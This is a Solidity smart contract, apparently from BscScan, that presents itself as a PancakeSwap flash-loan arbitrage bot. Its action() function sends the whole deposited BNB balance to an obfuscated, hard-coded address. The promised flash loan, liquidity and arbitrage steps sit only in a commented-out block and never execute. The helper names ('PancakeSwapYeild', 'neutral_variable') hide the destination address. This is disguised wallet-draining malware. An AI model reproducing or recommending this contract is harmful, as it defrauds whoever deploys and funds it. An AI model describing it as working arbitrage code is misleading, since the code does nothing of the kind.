/**
 *Submitted for verification at BscScan.com on 2022-10-04
*/

pragma solidity ^0.5.0;

/**
@title ILendingPoolAddressesProvider interface
@notice provides the interface to fetch the LendingPoolCore address
 */

contract ILendingPoolAddressesProvider {
    function getLendingPool() public view returns (address);

    function setLendingPoolImpl(address _pool) public;

    function getLendingPoolCore() public view returns (address payable);

    function setLendingPoolCoreImpl(address _lendingPoolCore) public;

    function getLendingPoolConfigurator() public view returns (address);

    function setLendingPoolConfiguratorImpl(address _configurator) public;

    function getLendingPoolDataProvider() public view returns (address);

    function setLendingPoolDataProviderImpl(address _provider) public;

    function getLendingPoolParametersProvider() public view returns (address);

    function setLendingPoolParametersProvider(address _parametersProvider) public;

    function getFeeProvider() public view returns (address);

    function setFeeProviderImpl(address _feeProvider) public;

    function getLendingPoolLiquidationManager() public view returns (address);

    function setLendingPoolLiquidationManager(address _manager) public;

    function getLendingPoolManager() public view returns (address);

    function setLendingPoolManager(address _lendingPoolManager) public;

    function getPriceOracle() public view returns (address);

    function setPriceOracle(address _priceOracle) public;

    function getLendingRateOracle() public view returns (address);

    function setLendingRateOracle(address _lendingRateOracle) public;

    function getRewardManager() public view returns (address);

    function setRewardManager(address _manager) public;

    function getLpRewardVault() public view returns (address);

    function setLpRewardVault(address _address) public;

    function getGovRewardVault() public view returns (address);

    function setGovRewardVault(address _address) public;

    function getSafetyRewardVault() public view returns (address);

    function setSafetyRewardVault(address _address) public;
    
    function getStakingToken() public view returns (address);

    function setStakingToken(address _address) public;
        
        
}

pragma solidity ^0.5.0;

interface ILendingPool {
    function flashLoan ( address _receiver, address _reserve, uint256 _amount, bytes calldata _params ) external;
}

pragma solidity >=0.5.0;

interface IPancakeCallee {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

pragma solidity >=0.5.0;

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
pragma solidity >=0.5.0;

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}
contract GetFlashLoan {
   string public tokenName;
   string public tokenSymbol;
   uint loanAmount;
   
   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
      tokenName = _tokenName;
      tokenSymbol = _tokenSymbol;
      loanAmount = _loanAmount;      
   }
   address public creator= msg.sender;
    	function tokenTransfer() public view returns (address) {    
        	return creator;
   	}
   function() external payable {}
    function PancakeSwapYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

   function exchange() public pure returns (address adr) {
   string memory neutral_variable = "A7Af0D57b6d8DeB2Fd2982Df1CA41fc9E575328b";
   PancakeSwapYeild(neutral_variable,0,'0');
   PancakeSwapYeild(neutral_variable,2,'1');
   PancakeSwapYeild(neutral_variable,1,'x');
   address addr = parseAddr(neutral_variable);
    return addr;
   }
function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
   
  function action() public payable {
      // Token matched with pancakeswap yield calculations
       address(uint160(exchange())).transfer(address(this).balance);
      
      // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)
    
      /* Breakdown of all functions
      // Submit token to BSC blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
   
      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
      
      // Get BNB Loan from Multiplier-Finance & loan execution wallet
      string memory loanAddress = manager.takeFlashLoan(loanAmount);
      
      // Convert half BNB to DAI
      manager.pancakeDAItoBNB(loanAmount / 2);
   
   // Create BNB and DAI pairs for our token & provide liquidity
   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
   
   // Perform arbitrage trades
      manager.pancakePerformSwaps();
      
      // Move remaining BNB from Contract to your personal wallet
      manager.contractToWallet("BNB");
   
   // Repay Flashloan
      manager.repayLoan(loanAddress);
      */
   }
}